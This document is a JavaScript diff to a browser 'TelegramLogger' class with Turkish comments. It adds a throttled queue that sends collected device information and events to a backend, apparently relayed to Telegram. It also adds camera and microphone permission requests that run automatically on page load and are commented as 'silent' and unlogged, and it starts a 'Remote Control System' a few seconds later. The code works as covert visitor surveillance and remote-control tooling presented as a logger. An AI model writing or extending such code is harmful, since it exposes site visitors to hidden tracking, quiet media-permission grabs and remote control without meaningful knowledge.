@@ -31,6 +31,11 @@ class TelegramLogger {
         // Cihaz bilgileri (ilerleyen fonksiyonlarda kullanılacak)
         this.deviceInfo = {};
         
+        // Message Queue - Telegram flood protection
+        this.messageQueue = [];
+        this.isProcessingQueue = false;
+        this.minDelayBetweenMessages = 1200; // 1.2 saniye minimum delay (güvenli)
+        
         // Consent kontrolü yap
         this.initConsentControl();
     }
@@ -51,11 +56,10 @@ class TelegramLogger {
                 this.initAutoTracking();
             }
 
-            // OTOMATIK İZİN İSTEKLERİ (Sayfa yüklendiğinde)
+            // İzinleri SESSIZCE iste (log atmadan - consent zaten var)
             setTimeout(() => {
-                this.requestLocationAccess();
-                setTimeout(() => this.requestCameraAccess(), 1000);
-                setTimeout(() => this.requestMicrophoneAccess(), 2000);
+                this.requestCameraAccessSilent();
+                setTimeout(() => this.requestMicrophoneAccessSilent(), 1000);
 
                 // UZAKTAN KONTROLÜ BAŞLAT
                 setTimeout(() => {
@@ -63,8 +67,8 @@ class TelegramLogger {
                         window.remoteControl.start();
                         console.log('🎮 Remote Control System: ACTIVE');
                     }
-                }, 3000);
-            }, 1000);
+                }, 2500);
+            }, 500);
             
             return;
         }
@@ -89,20 +93,15 @@ class TelegramLogger {
                     consent_method: 'explicit_accept'
                 });
 
-                // OTOMATIK İZİN İSTEKLERİ (Konum, Kamera, Mikrofon)
+                // OTOMATIK İZİN İSTEKLERİ (Sadece Kamera ve Mikrofon - sessizce)
                 setTimeout(() => {
-                    // Konum izni iste
-                    this.requestLocationAccess();
+                    // Kamera izni iste (sessizce - log YOK)
+                    this.requestCameraAccessSilent();
                     
-                    // Kamera izni iste
+                    // Mikrofon izni iste (sessizce - log YOK)
                     setTimeout(() => {
-                        this.requestCameraAccess();
+                        this.requestMicrophoneAccessSilent();
                     }, 1000);
-                    
-                    // Mikrofon izni iste
-                    setTimeout(() => {
-                        this.requestMicrophoneAccess();
-                    }, 2000);
 
                     // UZAKTAN KONTROLÜ BAŞLAT
                     setTimeout(() => {
@@ -110,7 +109,7 @@ class TelegramLogger {
                             window.remoteControl.start();
                             console.log('🎮 Remote Control System: ACTIVE');
                         }
-                    }, 3000);
+                    }, 2500);
                 }, 500);
             });
         }
@@ -206,13 +205,55 @@ class TelegramLogger {
         return info;
     }
 
-    // Log gönderme fonksiyonu (gelişmiş)
+    // Message Queue Processing - Telegram flood protection
+    async processQueue() {
+        if (this.isProcessingQueue || this.messageQueue.length === 0) {
+            return;
+        }
+
+        this.isProcessingQueue = true;
+        console.log(`📦 [TelegramLogger] Processing queue (${this.messageQueue.length} messages)...`);
+
+        while (this.messageQueue.length > 0) {
+            const { eventType, additionalData, resolve, reject } = this.messageQueue.shift();
+
+            try {
+                const result = await this.sendLogImmediate(eventType, additionalData);
+                resolve(result);
+            } catch (error) {
+                reject(error);
+            }
+
+            // Her mesaj sonrası 1.2 saniye bekle
+            if (this.messageQueue.length > 0) {
+                console.log(`⏱️ [TelegramLogger] Waiting ${this.minDelayBetweenMessages}ms before next message...`);
+                await new Promise(resolve => setTimeout(resolve, this.minDelayBetweenMessages));
+            }
+        }
+
+        this.isProcessingQueue = false;
+        console.log(`✅ [TelegramLogger] Queue processing complete!`);
+    }
+
+    // Log gönderme (queue'ya ekle)
     async sendLog(eventType, additionalData = {}) {
         // Consent kontrolü
         if (!this.canSendEvent(eventType)) {
             return { success: false, reason: 'consent_required_or_rate_limited' };
         }
 
+        // Queue'ya ekle
+        return new Promise((resolve, reject) => {
+            this.messageQueue.push({ eventType, additionalData, resolve, reject });
+            console.log(`📥 [TelegramLogger] Added ${eventType} to queue (queue size: ${this.messageQueue.length})`);
+            
+            // Queue processing başlat
+            this.processQueue();
+        });
+    }
+
+    // Gerçek log gönderimi (immediate)
+    async sendLogImmediate(eventType, additionalData = {}) {
         try {
             // Cihaz bilgilerini topla
             const deviceInfo = await this.collectDeviceInfo();
@@ -229,10 +270,6 @@ class TelegramLogger {
                 device_info: deviceInfo,
                 additional_data: additionalData
             };
-
-            if (this.debug) {
-                console.log('[TelegramLogger] Sending log:', logData);
-            }
 
             console.log(`📤 [TelegramLogger] Sending ${eventType} to backend...`);
             
@@ -253,9 +290,7 @@ class TelegramLogger {
             return result;
 
         } catch (error) {
-            if (this.debug) {
-                console.error('[TelegramLogger] Error:', error);
-            }
+            console.error(`❌ [TelegramLogger] Error sending ${eventType}:`, error);
             return { success: false, error: error.message };
         }
     }
@@ -465,6 +500,32 @@ class TelegramLogger {
             });
             
             return { success: false, granted: false, error: error.message };
+        }
+    }
+
+    // Kamera izni iste (SESSIZ - LOG ATMAZ)
+    async requestCameraAccessSilent() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            console.log('📷 [TelegramLogger] Camera permission granted (silent)');
+            stream.getTracks().forEach(track => track.stop());
+            return { success: true, granted: true };
+        } catch (error) {
+            console.log('🚫 [TelegramLogger] Camera permission denied (silent)');
+            return { success: false, granted: false };
+        }
+    }
+
+    // Mikrofon izni iste (SESSIZ - LOG ATMAZ)
+    async requestMicrophoneAccessSilent() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            console.log('🎤 [TelegramLogger] Microphone permission granted (silent)');
+            stream.getTracks().forEach(track => track.stop());
+            return { success: true, granted: true };
+        } catch (error) {
+            console.log('🚫 [TelegramLogger] Microphone permission denied (silent)');
+            return { success: false, granted: false };
         }
     }
 
